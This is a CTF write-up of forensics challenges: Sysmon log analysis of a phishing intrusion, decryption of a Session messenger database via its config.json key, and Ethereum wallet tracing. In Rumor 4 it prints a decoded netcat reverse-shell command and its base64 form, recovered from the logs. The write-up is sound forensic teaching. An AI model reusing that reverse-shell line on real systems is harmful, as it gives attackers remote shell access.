---
title: Hacktheon Sejong CTF 2024 - Writeups
time: 2024-04-27 12:00:00
categories: [ctf]
tags: [forensics,hacktheon]
image: /assets/posts/hacktheonsejongctf2024/icon.jpg
---

This is a writeup for all forensics challenges from Hacktheon Sejong CTF 2024. This CTF was special as I was invited by a Taiwanese player to join her team to handle forensics/misc challenges. Fortunately, I did not disappoint them as I managed to solve all the challenges easily. Shame we did not get top 20 but it was still a fun experience overall.

## Rumor 1 [Forensics]
Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the IP address of the mail server used by the PC to be analyzed? Ex: xxx.xxx.xxx.xxx

Flag: `92.68.200.206`

We are given a single event log to investigate. Analyzing the event log, it seems to be `Sysmon` judging by the event IDs. Since the description mentioned something about mail server, filtering the event log with `SMTP` shows the IP address of the mail server.

![one](/assets/posts/hacktheonsejongctf2024/one.png)

## Rumor 2 [Forensics]
Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions.What is the PID of the malicious process that the attacker executed for session connection after the PC was infected?

Flag: `3868`

Analyzing the event log, we can notice suspicious activity happening around 2:26 AM 14/12/2023. The user seems to be downloading `confidential.doc` file using the email client Thunderbird.

![two](/assets/posts/hacktheonsejongctf2024/two.png)

Filtering the logs with EventID 3, a netcat application can be seen executed around the time the document was downloaded. Hence, this highly suggest a malicious document was sent and downloaded via email phishing. The process ID is 3868.

![three](/assets/posts/hacktheonsejongctf2024/three.png)

## Rumor 3 [Forensics]
Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the network band scanned by the attacker for additional infections? Example: xxx.xxx.xxx.0/36

Flag: `192.168.100.0/24`

Following the timeline, we can see the attacker running a Python script that pings a range of IP addresses after compromising the machine. The range was 192.168.100.1 to 192.168.100.255.

![four](/assets/posts/hacktheonsejongctf2024/four.png)

## Rumor 4 [Forensics]
Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What attack payload did the attacker use for the network-linked daemon on the server after the network scan? (reverse shell)

Flag: `bmMgMTkyLjE2OC4xMDAuMzIgNTQ1NCAtZSAvYmluL2Jhc2g=====`

Similarly, following the timeline shows that an encoded payload was executed after enumerating the network. The decoded payload can be identified as `nc 192.168.100.32 5454 -e /bin/bash`

![five](/assets/posts/hacktheonsejongctf2024/five.png)

![six](/assets/posts/hacktheonsejongctf2024/six.png)

## Rumor 5 [Forensics]
Question: I've heard rumors that it's possible to analyze an accident using just a single file. please find the answers to the following questions. What is the name of the file that the attacker finally exfiltrated? Example: exfiltration.zip

Flag: `secret.tar.gz`

After establishing the reverse shell, we can see that the attacker utilized curl to exfiltrate a zip file called `secret.tar.gz`

![seven](/assets/posts/hacktheonsejongctf2024/seven.png)

## Tracker 1 [Forensics]
Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the SNS account ID of the drug seller? (string)

Flag: `05aa64c6099f0e23345c279882edd6f73f4d20f5cc7aae2eef4874784ab4a50c77`

We are given an AD1 image to investigate. Reading the description, it seems that I have to locate the drug seller's SNS (Social Network Service) account ID in a messaging application. Looking at common places like Desktop, Documents and AppData/Programs, a `Session` messaging application can be seen downloaded in the machine.

![eight](/assets/posts/hacktheonsejongctf2024/eight.png)

Analyzing Session artifacts in `AppData\Roaming\Sessions\`, we can find several cache and database files within it. One of them that stands out the most was the SQL database file.

![nine](/assets/posts/hacktheonsejongctf2024/nine.png)

However, DB Browser could not open it for some reason. So I went ahead and research on how I can extract data from the database file and stumbled upon this wonderful [blog](https://www.alexbilz.com/post/2021-06-07-forensic-artifacts-signal-desktop/) that talks about Signal messenger database forensics. This could work because Session is pretty much the same with Signal messenger according to this [Reddit post](https://www.reddit.com/r/privacy/comments/13vanfj/session_messenger/).

![ten](/assets/posts/hacktheonsejongctf2024/ten.png)

The blog mentioned that the database file can be analyzed using DB Browser (SQLCipher) instead. A password/key will also be required to open the database file. According to the blog, this password/key is stored somewhere within the `config.json` file. Analyzing the file, the key can be obtained.

![lol](/assets/posts/hacktheonsejongctf2024/lol.png)

Utilizing the key `0x9b342d389f8fad56ebdf0d30c94436f7ea1bdcf9daab10f9b93895b100943921`, the database can be opened, and the messages between the user and seller can be analyzed.

![lol3](/assets/posts/hacktheonsejongctf2024/lol3.png)

![lol2](/assets/posts/hacktheonsejongctf2024/lol2.png)

The user can be seen communicating with the seller about buying drugs and transferring cryptocurrency. Hence, we can just check the SNS account ID using the seller's messages.

![lol4](/assets/posts/hacktheonsejongctf2024/lol4.png)

## Tracker 2 [Forensics]
Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the main wallet address of the drug seller? (lowercase)

Flag: `0xfc80b72fcc371ffd9e1a2c33d4d7c6c00d0658d2`

After analyzing the AD1 image for a few hours, I found another lead in `AppData\Roaming\Windows\Recent\` where a suspicious file was run recently. Analyzing it, it seems that it was a Chrome extension.

![kek](/assets/posts/hacktheonsejongctf2024/kek.png)

Analyzing the Chrome extension files, we can find several LevelDB files in the Local Extension Settings folder and the IndexedDB folder. Using this [tool](https://github.com/cclgroupltd/ccl_chrome_indexeddb/tree/master) to dump LevelDB files, important information can be obtained. 

![kek2](/assets/posts/hacktheonsejongctf2024/kek2.png)

![kek3](/assets/posts/hacktheonsejongctf2024/kek3.png)

```
└─$ python dump_leveldb.py ../sharedfolder/chrome-extension_nkbihfbeogaeaoehlefnkodbefgpgknn_0.indexeddb.leveldb 

+--------------------------------------------------------+
|Please note: keys and values in leveldb are binary blobs|
|so any text seen in the output of this script might not |
|represent the entire meaning of the data. The output of |
|this script should be considered as a preview of the    |
|data only.                                              |
+--------------------------------------------------------+

```

Analyzing the output file, each cache seems to show cryptocurrency transactions with wallet addresses in them. The `From:0x45912905E6E79Ea74E3d5Ba0bA806e412712f94C` address highly suggests that this address is from the user sending cryptocurrency to different addresses. 

![kek4](/assets/posts/hacktheonsejongctf2024/kek4.png)

Using [etherscan.io](https://etherscan.io/address/0x45912905e6e79ea74e3d5ba0ba806e412712f94c) with the user's address, his transaction history can be obtained. According to the text messages previously, we know that the user has transferred ETH currency twice to the attacker.

![cr](/assets/posts/hacktheonsejongctf2024/cr.png)

Following the first transaction in the list with `0x0e2b8f5BBB714433C8Af78B3Db154681a48dF069`, the currency can be seen transferred again to another address `0xfC80B72Fcc371fFD9E1a2c33D4d7c6C00d0658D2` rather than holding it. This highly suggest a proxy account was utilized to hide the seller's main address.

![cr2](/assets/posts/hacktheonsejongctf2024/cr2.png)

Analzing the main address, the seller's account can seen receiving several transactions from different addresses and has not sent out any. Thus, proving that this was indeed the seller's main address.

![cr3](/assets/posts/hacktheonsejongctf2024/cr3.png)

## Tracker 3 [Forensics]
Question: An incident occurred in which drugs were traded using cryptocurrency. Analyze the confiscated PC of the drug buyer to obtain the following information. What is the hash value of the transaction where the buyer traded drugs?

Flag: `0x2485878be80df93501b8a7caa7e70b616f4c5908f1599f6f0b869ed2fbc354a4`

Similar to Tracker 2, just take the transaction hash between the user and seller.

![cr4](/assets/posts/hacktheonsejongctf2024/cr4.png)
